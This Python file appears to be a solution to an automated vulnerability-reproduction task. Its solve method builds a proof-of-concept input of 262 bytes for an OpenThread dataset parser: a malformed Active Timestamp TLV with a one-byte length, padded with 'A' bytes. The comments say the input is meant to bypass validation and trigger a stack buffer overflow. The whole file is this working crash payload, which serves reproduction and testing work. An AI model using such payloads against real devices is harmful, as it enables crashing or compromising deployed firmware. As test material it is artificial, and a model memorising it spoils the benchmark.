import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Based on the vulnerability description, we need to create
        # a dataset with invalid TLVs (Active/Pending Timestamp or Delay Timer)
        # that have insufficient length. This should bypass validation
        # and cause a stack buffer overflow when processed.
        
        # We'll construct a minimal PoC that should trigger the overflow.
        # The exact structure would depend on the OT dataset format,
        # but we can create a generic invalid TLV structure.
        
        # Create a dataset with malformed TLV
        # TLV format: Type (1 byte) | Length (1 byte) | Value (variable)
        
        # Active Timestamp TLV (type 7) with insufficient length
        # According to Thread spec, Active Timestamp should be 8 bytes minimum
        # but we'll set length to 1 to trigger buffer overflow
        
        poc = bytearray()
        
        # Dataset TLVs
        # Active Timestamp TLV - malformed with length 1 (should be at least 8)
        poc.append(7)  # TLV type for Active Timestamp
        poc.append(1)  # Length - insufficient, should cause overflow
        poc.append(0xAA)  # Single byte instead of required 8
        
        # Add more data to reach the target length and ensure overflow
        # Fill with pattern to help trigger crash
        remaining_bytes = 262 - len(poc)
        poc.extend(b'A' * remaining_bytes)
        
        return bytes(poc)